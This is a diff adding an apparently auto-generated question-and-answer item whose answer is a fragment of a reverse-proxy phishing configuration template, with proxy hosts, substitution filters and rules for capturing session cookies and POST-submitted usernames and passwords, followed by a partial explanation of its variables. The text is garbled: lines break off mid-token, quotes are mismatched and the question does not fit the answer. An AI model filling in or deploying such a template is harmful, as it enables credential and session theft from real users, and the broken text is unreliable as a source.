@@ -1,0 +1,33 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+- {phish_sub: ‘<replace_subdomain>’, orig_sub: '<re
+session: true, is_landing: true, auto_filter: true}
+sub_filters:
+- {triggers_on: ‘<target_domain>’, orig_sub: ‘<repl
+search: 'something_to_look_for', replace: 'replace_it
+auth_tokens:
+- domain: '.<replace_subdomain>.<target_domain>’
+keys: ['cookie_name']
+credentials:
+username:
+key: 'email'
+search: '(.*)'
+type: 'post'
+password:
+key: 'password'
+search: '(.*)'
+type: 'post'
+login:
+domain: '.<replace_subdomain>.<target_domain>’
+path: '/<path>’
+There are multiple variables inside of the sample file that you will need to
+understand:
+• proxy_hosts: This section defines the domains and subdomains used to
+proxy between the legitimate server and end user.
